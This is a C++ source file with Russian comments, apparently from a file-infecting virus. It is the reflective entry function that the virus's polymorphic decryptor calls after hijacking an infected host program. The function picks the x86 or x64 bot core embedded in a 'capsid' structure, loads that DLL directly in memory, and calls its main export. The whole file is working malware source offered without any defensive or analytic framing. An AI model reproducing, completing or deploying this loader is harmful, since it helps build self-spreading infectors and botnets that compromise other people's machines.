#include "virus_entry.h"
#include "DllLoader.h"

typedef VOID(WINAPI *fnMainFunction)(capsid_metadata*);

#ifdef _REFLECTIVE_MODE
// данная базонезависимая функция вызывается стартап кодом вируса (полиморфным декриптором) на который осуществляется переход при перехвате управления хостовым апп
// резолвит апи необходимые для работы пе лоадера, загружает основную длл бота в память в зависимости от разрядности 
__declspec(dllexport) void WINAPI entry(capsid_metadata *capsid)
{
	// адрес ядра инфектора для загрузки
	LPBYTE lpCorePtr = nullptr;
#ifndef _WIN64 
	// данная функция была вызвана x86 стартап кодом, поэтому грузим x86 длл бота
	// адрес x86 длл - начало капсида + дельта до ядра x86
	lpCorePtr = (LPBYTE)((SIZE_T)capsid + (SIZE_T)capsid->offset_x86core);
#else 
	// данная функция была вызвана x64 стартап кодом, поэтому грузим x64 длл бота
	// адрес x64 длл - начало капсида + дельта до ядра x64
	lpCorePtr = (LPBYTE)((SIZE_T)capsid + (SIZE_T)capsid->offset_x64core);
#endif

	loader_functions ctx;
	do
	{
		// резолвим апи необходимые для работы пе лоадера
		if (!resolve_functions(&ctx))
			break;

		// загрузим основную длл бота
		HMEMORYMODULE hCoreModule = MemoryLoadLibrary(&ctx, lpCorePtr);
		if (hCoreModule == NULL)
			break;

#ifdef _WIN64
		// имя экспорта на 64
		unsigned char main_func[2];
		main_func[0] = 'a';
		main_func[1] = '\0';
#else
		// на 86
		unsigned char main_func[8];
		main_func[0] = '_';
		main_func[1] = 'a';
		main_func[2] = '@';
		main_func[3] = '4';
		main_func[4] = '\0';
#endif
		// импорт и вызов главной функции бота
		fnMainFunction _Main = (fnMainFunction)MemoryGetProcAddress(&ctx, hCoreModule, (const char*)main_func);
		if (_Main == nullptr)
			break;

		_Main(capsid);

	} while (FALSE);

	return;
}

#endif